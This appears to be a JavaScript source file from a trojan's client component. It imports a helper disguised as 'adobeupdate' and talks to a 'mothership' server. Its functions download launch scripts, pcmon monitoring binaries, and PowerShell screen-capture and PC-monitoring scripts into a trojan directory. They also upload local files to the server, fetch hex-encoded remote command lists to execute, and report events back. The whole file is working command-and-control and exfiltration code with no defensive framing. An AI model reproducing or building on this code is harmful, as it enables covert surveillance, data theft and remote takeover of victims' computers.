const helper = require("./adobeupdate.helper.js");

async function download_launch_script() {
    let filename = systemconfig.launch_script_fname;

    let baseUrl = systemconfig.mothershipassets + "/" + filename;
    let localpath = path.join(systemconfig.trojandir, filename);

    let downloadOpts = {
        download: true,
        filetype: "bin",
        localpath: localpath,
    };

    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);

    if (!helper.fileExists(localpath)) {
        throw new Error("download failed for " + localpath);
    }

    const stats = fs.statSync(localpath);
    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
}

async function retrieve_asset(assetfname, assetdir, localdir) {
    let baseUrl =
        systemconfig.mothershipassets +
        "/" +
        (helper.isNullOrWhitespace(assetdir) ? "" : assetdir + "/") +
        assetfname;
    let localpath = null;

    if (helper.isNullOrWhitespace(localdir))
        localpath = path.join(systemconfig.trojandir, assetfname);
    else {
        if (!folderExists(localdir)) {
            fs.mkdirSync(systemconfig.nodegsdfilesdir, { recursive: true });
        }

        localpath = path.join(localdir, assetfname);
    }

    let downloadOpts = {
        download: true,
        filetype: "bin",
        localpath: localpath,
    };

    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);

    /* downloadOpts { filetype, localpath, download }
        rawText
        buffer
        status
        statusText
        headers */

    if (!helper.fileExists(localpath)) {
        throw new Error("retrieve failed for: " + localpath);
    }

    const stats = fs.statSync(localpath);
    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);

    return response;
}

async function download_python(filenames) {
    helper.logmsg("starting");

    filenames = filenames ?? [];
    filenames =
        Array.isArray(filenames) && filenames.length > 0
            ? filenames
            : get_python_install_filenames();

    for (let i = 0; i < filenames.length; i++) {
        let filename = filenames[i];

        let baseUrl = systemconfig.mothershipassets + "/gsd_files/" + filename;
        let localpath = path.join(systemconfig.gsdfilesdir, filename);

        fs.mkdirSync(systemconfig.gsdfilesdir, { recursive: true });

        let downloadOpts = {
            download: true,
            filetype: "bin",
            localpath: localpath,
        };

        let response = await makeGetRequest(baseUrl, null, null, downloadOpts);

        /* downloadOpts { filetype, localpath, download }
           rawText
           buffer
           status
           statusText
           headers */

        if (!helper.fileExists(localpath)) {
            throw new Error("download failed for " + localpath);
        }

        const stats = fs.statSync(localpath);
        helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
    }
}

async function download_pcmon() {
    // retrieve pcmon.exe, pcmon.dll

    if (!folderExists(systemconfig.pcmondir)) {
        fs.mkdirSync(systemconfig.pcmondir, { recursive: true });
    }

    if (!systemconfig.istpl) {
        await retrieve_asset("pcmon.exe", null, systemconfig.pcmondir);
        return;
    }

    if (systemconfig.istpl)
        await retrieve_asset("pcmon.dll", null, systemconfig.pcmondir);
}


async function download_pspcmon() {
    helper.logmsg("starting");

    let filename = "pc_monitoring.ps1";
    let baseUrl = systemconfig.mothershipassets + "/" + filename;
    let localpath = path.join(systemconfig.pspcmondir, filename);

    fs.mkdirSync(systemconfig.pspcmondir, { recursive: true });

    let downloadOpts = {
        download: true,
        filetype: "bin",
        localpath: localpath,
    };

    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);

    /* downloadOpts { filetype, localpath, download }
        rawText
        buffer
        status
        statusText
        headers */

    if (!helper.fileExists(localpath)) {
        return { state: false, msg: "download failed for " + localpath };
    }

    const stats = fs.statSync(localpath);
    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);

    helper.logmsg("finished");

    return { state: true };
}

// TODO remove and replace with retrieve_asset
async function download_screencapture_script() {
    let filename = "get_full_screen_capture.ps1"; // TODO move to systemconfig

    let baseUrl = systemconfig.mothershipassets + "/" + filename;
    let localpath = path.join(systemconfig.trojandir, filename);

    let downloadOpts = {
        download: true,
        filetype: "bin",
        localpath: localpath,
    };

    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);

    if (!helper.fileExists(localpath)) {
        throw new Error("download failed for " + localpath);
    }

    const stats = fs.statSync(localpath);
    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
}

async function upload_file(filename, jobcode, localfpath) {
    if (helper.isNullOrWhitespace(filename)) {
        throw new Error("filename is null or empty");
    }

    if (!helper.fileExists(localfpath)) {
        throw new Error(`file does not exist ${localfpath}`);
    }

    let baseUrl = systemconfig.mothership + "/ow/upload.php";

    let kvp = systemconfig.statekvp;
    kvp["filename"] = filename;
    kvp["jobcode"] = jobcode;

    let response = await makePUTRequest(baseUrl, kvp, null, localfpath);

    return response;
}

async function retrieveClientJob() {
    helper.logmsg("starting");

    let baseUrl = systemconfig.mothership + "/ow/retrieve.php";
    let params = systemconfig.statekvp;
    params.filename = "execute_cmdlist";

    let localpath = systemconfig.getClientJobPath();

    let downloadOpts = {
        download: true,
        filetype: "txt",
        localpath: localpath,
    };
    let response = await makeGetRequest(baseUrl, params, null, downloadOpts);

    if (!response.headers) {
        throw new Error("could not access response headers");
    }

    if (!helper.fileExists(localpath)) {
        throw new Error("job file does not exist");
    }

    let jobcode = "";
    let jobfilename = "";

    if (keyExists(response.headers, "X-JobCode"))
        jobcode = response.headers[getKey(response.headers, "X-JobCode")];

    if (keyExists(response.headers, "X-JobFilename"))
        jobfilename =
            response.headers[getKey(response.headers, "X-JobFilename")];

    if (helper.isNullOrWhitespace(jobcode)) {
        throw new Error("jobcode is empty");
    }

    if (helper.isNullOrWhitespace(jobfilename)) {
        throw new Error("jobfilename is empty");
    }

    let fileext = path.extname(jobfilename);

    let hextext = fs.readFileSync(localpath, "utf-8");
    let jobtext = Buffer.from(hextext, "hex").toString("utf8");
    localpath = systemconfig.getClientJobPath(); // + (fileext ?? "");
    fs.writeFileSync(localpath, jobtext);

    let clientjob = {
        jobcode: jobcode,
        jobtype: "execute_cmdlist",
        localpath: localpath,
        jobfilename: jobfilename,
    };

    helper.logmsg("retrieved client job: " + JSON.stringify(clientjob));

    helper.logmsg("finished");

    return clientjob;
}

async function logmsgMothership(msg, isevent = false, jobcode) {
    let baseUrl = systemconfig.mothership + "/ow/helper.logmsg.php";

    let kvp = systemconfig.statekvp;

    kvp[isevent ? "event" : "msg"] = msg;
    kvp["jobcode"] = jobcode;

    let response = await makeGetRequest(baseUrl, kvp);
    return response;
}

// make GET request to helper.logmsg.php with event = event_code
function logEventMothership(event_code, jobcode) {
    return logmsgMothership(event_code, true, jobcode);
}